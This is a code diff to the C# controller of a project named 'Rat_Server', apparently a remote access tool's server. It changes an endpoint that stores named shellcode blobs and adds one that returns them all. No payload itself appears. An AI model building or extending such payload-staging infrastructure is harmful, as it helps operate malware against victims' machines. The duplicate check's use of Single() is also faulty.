@@ -1,6 +1,7 @@
 ﻿using Microsoft.AspNetCore.Authorization;
 using Microsoft.AspNetCore.Http;
 using Microsoft.AspNetCore.Mvc;
+using Microsoft.EntityFrameworkCore;
 using Org.BouncyCastle.Utilities;
 using Rat_Server.Model.Context;
 using Rat_Server.Model.DTOs;
@@ -40,22 +41,33 @@ namespace Rat_Server.Controllers
         [HttpPost("AddShellCode")]
         [ProducesResponseType(StatusCodes.Status201Created)]
         [ProducesResponseType(StatusCodes.Status409Conflict)]
-        public async Task<ActionResult> AddShellCode([FromBody] string Name, [FromBody] byte[] Code)
+        public async Task<ActionResult> AddShellCode([FromBody] ShellCodeDto shellCodeDto)
         {
-            if(_context.ShellCodes.Single(b => b.Name == Name) != null)
+            if(_context.ShellCodes.Single(b => b.Name == shellCodeDto.Name) != null)
             {
                 return StatusCode(StatusCodes.Status409Conflict);
             }
 
             await _context.ShellCodes.AddAsync(new ShellCode
             {
-                Name = Name,
-                Code = Code
+                Name = shellCodeDto.Name,
+                Code = shellCodeDto.Code
             });
 
             await _context.SaveChangesAsync();
 
             return StatusCode(StatusCodes.Status201Created);
+        }
+
+        [HttpGet("GetAllShellCode")]
+        [ProducesResponseType(typeof(List<ShellCodeDto>), StatusCodes.Status200OK)]
+        public async Task<ActionResult<List<ShellCodeDto>>> GetAllShellCode()
+        {
+            return await _context.ShellCodes.Select(b => new ShellCodeDto
+            {
+                Name = b.Name,
+                Code = b.Code
+            }).ToListAsync();
         }
     }
 }
